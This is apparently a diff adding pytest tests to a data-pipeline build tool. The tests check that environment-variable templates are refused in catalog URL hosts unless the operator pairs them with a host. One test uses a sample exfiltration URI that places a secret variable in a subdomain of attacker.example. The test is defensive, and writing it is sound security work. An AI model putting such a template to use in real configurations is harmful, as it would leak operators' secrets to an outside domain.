@@ -361,3 +361,150 @@ def test_embedded_handwritten_config_with_catalog_auth_is_refused(
     assert execute_debezium_build(contract["builds"][0], contract, tmp_path) == 1
     assert not _props_path(contract, tmp_path).exists()
     assert fake_server.calls == []
+
+
+# ── {{ env.* }} in an address: the operator's environment never picks the host ──
+#
+# The acquisition dispatcher renders ``{{ env.* }}`` from the operator's environment before
+# a runner starts. In the host of a catalog URI that sent the variable's value, in the host
+# name, to whoever owns the domain the contract names. A credential-shaped variable never
+# renders into a URL or a host field; any other renders into a URL's authority or a host
+# field only for the host the operator paired it with (``NAME@host``).
+
+_PROBE = "synthvalue123"
+
+
+def _dispatch(contract: Dict[str, Any], tmp_path: Path) -> int:
+    from fluid_build.build_runners.base import _execute_acquisition_build
+
+    return _execute_acquisition_build(contract["builds"][0], contract, tmp_path, dry_run=False)
+
+
+@pytest.fixture(params=["kafka-connect", "debezium"])
+def sink_engine(request, tmp_path: Path, monkeypatch):
+    """One acquisition engine with its server faked, and a way to build its contract and to
+    see what it would start: ``(contract_for(location), pushed())``."""
+    if request.param == "kafka-connect":
+        mock = request.getfixturevalue("kafka_connect_mock")
+
+        def contract_for(location: Dict[str, Any], **_: Any) -> Dict[str, Any]:
+            return _kc_contract(None, location=location)
+
+        return contract_for, lambda: repr(mock.connectors)
+    recorder = _install_fake_server(monkeypatch)
+    paths: List[Path] = []
+
+    def dbz_contract_for(location: Dict[str, Any], **_: Any) -> Dict[str, Any]:
+        contract = _dbz_contract(None, location=location)
+        paths.append(_props_path(contract, tmp_path))
+        return contract
+
+    def pushed() -> str:
+        started = repr(recorder.calls)
+        written = "".join(p.read_text() for p in paths if p.exists())
+        return started + written
+
+    return dbz_contract_for, pushed
+
+
+def _catalog(uri: str) -> Dict[str, Any]:
+    return {
+        "catalog": "lakekeeper",
+        "uri": uri,
+        "warehouse": "demo",
+        "database": "bronze",
+        "table": "orders",
+    }
+
+
+def test_a_credential_shaped_variable_never_renders_into_a_catalog_host(
+    sink_engine, tmp_path: Path, monkeypatch, capsys, caplog
+):
+    contract_for, pushed = sink_engine
+    monkeypatch.setenv("OPERATOR_SYNTH_SECRET", _PROBE)
+    contract = contract_for(
+        _catalog("https://{{ env.OPERATOR_SYNTH_SECRET }}.attacker.example/catalog")
+    )
+
+    with caplog.at_level(logging.DEBUG):
+        rc = _dispatch(contract, tmp_path)
+
+    shown = capsys.readouterr()
+    assert rc == 1
+    assert _PROBE not in pushed() and "attacker.example" not in pushed()
+    assert "OPERATOR_SYNTH_SECRET" in shown.out + shown.err, "the refusal names the variable"
+    assert "location.uri" in shown.out + shown.err, "and the field"
+    assert _PROBE not in shown.out + shown.err + caplog.text, "never the rendered value"
+
+
+def test_a_variable_that_makes_a_host_renders_only_when_the_operator_paired_it(
+    sink_engine, tmp_path: Path, monkeypatch, capsys, caplog
+):
+    contract_for, pushed = sink_engine
+    monkeypatch.setenv("CATALOG_HOST", "lake")
+    contract = contract_for(_catalog("https://{{ env.CATALOG_HOST }}keeper:8443/catalog"))
+
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "CATALOG_HOST@elsewhere")
+    with caplog.at_level(logging.DEBUG):
+        assert _dispatch(contract, tmp_path) == 1
+    shown = capsys.readouterr()
+    assert "lakekeeper" not in pushed()
+    assert "CATALOG_HOST" in shown.out + shown.err
+    assert "FLUID_ACQUISITION_SECRET_REF_ALLOWLIST" in shown.out + shown.err
+    assert "lakekeeper" not in shown.out + shown.err + caplog.text, "never the rendered host"
+
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "CATALOG_HOST@lakekeeper")
+    assert _dispatch(contract, tmp_path) == 0
+    assert "https://lakekeeper:8443/catalog" in pushed()
+
+
+def test_a_paired_variable_with_no_host_is_paired_with_every_host(
+    sink_engine, tmp_path: Path, monkeypatch
+):
+    contract_for, pushed = sink_engine
+    monkeypatch.setenv("CATALOG_HOST", "lake")
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "CATALOG_HOST")
+    contract = contract_for(_catalog("https://{{ env.CATALOG_HOST }}keeper:8443/catalog"))
+    assert _dispatch(contract, tmp_path) == 0
+    assert "https://lakekeeper:8443/catalog" in pushed()
+
+
+def test_a_variable_that_is_the_whole_catalog_host_needs_no_pairing(
+    sink_engine, tmp_path: Path, monkeypatch
+):
+    """The operator's variable makes the address; the contract only says which one."""
+    contract_for, pushed = sink_engine
+    monkeypatch.setenv("CATALOG_HOST", "lakekeeper:8443")
+    monkeypatch.delenv(SECRET_REF_ALLOWLIST, raising=False)
+    contract = contract_for(_catalog("https://{{ env.CATALOG_HOST }}/catalog"))
+    assert _dispatch(contract, tmp_path) == 0
+    assert "https://lakekeeper:8443/catalog" in pushed()
+
+
+def test_a_template_in_the_path_of_a_url_needs_no_pairing_but_a_secret_one_is_refused(
+    sink_engine, tmp_path: Path, monkeypatch, capsys
+):
+    contract_for, pushed = sink_engine
+    monkeypatch.setenv("CATALOG_TENANT", "acme")
+    contract = contract_for(_catalog("https://lakekeeper:8443/{{ env.CATALOG_TENANT }}/catalog"))
+    assert _dispatch(contract, tmp_path) == 0
+    assert "https://lakekeeper:8443/acme/catalog" in pushed()
+
+    monkeypatch.setenv("TENANT_SECRET", _PROBE)
+    leaky = contract_for(_catalog("https://lakekeeper:8443/{{ env.TENANT_SECRET }}/catalog"))
+    capsys.readouterr()
+    assert _dispatch(leaky, tmp_path) == 1
+    assert _PROBE not in capsys.readouterr().out
+
+
+def test_an_unset_variable_in_a_catalog_host_is_refused_by_name(
+    sink_engine, tmp_path: Path, monkeypatch, capsys
+):
+    contract_for, pushed = sink_engine
+    monkeypatch.delenv("CATALOG_HOST", raising=False)
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "CATALOG_HOST")
+    contract = contract_for(_catalog("https://{{ env.CATALOG_HOST }}/catalog"))
+    assert _dispatch(contract, tmp_path) == 1
+    shown = capsys.readouterr()
+    assert "CATALOG_HOST" in shown.out + shown.err and "not set or empty" in shown.out + shown.err
+    assert pushed() in ("{}", "[]", "")
